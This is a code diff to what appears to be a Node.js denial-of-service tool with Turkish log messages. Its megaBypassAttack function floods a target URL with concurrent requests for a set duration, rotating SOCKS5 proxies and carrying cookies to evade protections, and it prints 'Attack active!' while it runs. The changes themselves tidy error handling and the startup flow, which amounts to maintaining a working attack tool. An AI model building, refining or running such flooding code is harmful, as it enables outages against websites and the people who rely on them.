@@ -80,7 +80,7 @@ async function sendRequest(targetUrl, cookies = {}, method = 'GET') {
     };
 
     const proxy = getRandom(proxies);
-    if (proxy && await testProxy(proxy)) {
+    if (proxy && (await testProxy(proxy))) {
         const [host, port] = proxy.split(':');
         const agent = new SocksProxyAgent(`socks5://${host}:${port}`);
         config.httpAgent = agent;
@@ -116,7 +116,11 @@ async function sendRequest(targetUrl, cookies = {}, method = 'GET') {
             cookies: newCookies,
         };
     } catch (error) {
-        return { success: false, error: error.message, cookies };
+        return {
+            success: false,
+            error: error && error.message ? error.message : 'Bilinmeyen hata',
+            cookies,
+        };
     }
 }
 
@@ -171,8 +175,9 @@ async function megaBypassAttack({ method, url, duration, threads }) {
                 successCount++;
                 process.stdout.write(`[+] ${result.status} `.green);
             } else {
+                const errorMessage = result.error ? result.error.slice(0, 20) : 'HATA';
                 failCount++;
-                process.stdout.write(`[-] ${result.error.slice(0, 20)} `.red);
+                process.stdout.write(`[-] ${errorMessage} `.red);
             }
         }
     }
@@ -180,19 +185,13 @@ async function megaBypassAttack({ method, url, duration, threads }) {
     const workers = Array.from({ length: threads }, () => worker());
     logStatus('Saldırı aktif!', 'green');
     await Promise.all(workers);
-
-    console.log(`\n✅ Başarılı istek: ${successCount}`.green);
-    console.log(`❌ Başarısız istek: ${failCount}`.red);
-    process.exit(0);
+    rl.close();
 }
 
-// Ana akış
-(async () => {
-    try {
-        const input = await getUserInput();
-        await megaBypassAttack(input);
-    } catch (err) {
-        console.error(`\n🚫 Hata: ${err.message}`.red);
-        process.exit(1);
-    }
-})();
+// Programı başlat
+getUserInput()
+    .then(megaBypassAttack)
+    .catch(err => {
+        console.error('HATA:', err.message.red);
+        rl.close();
+    });
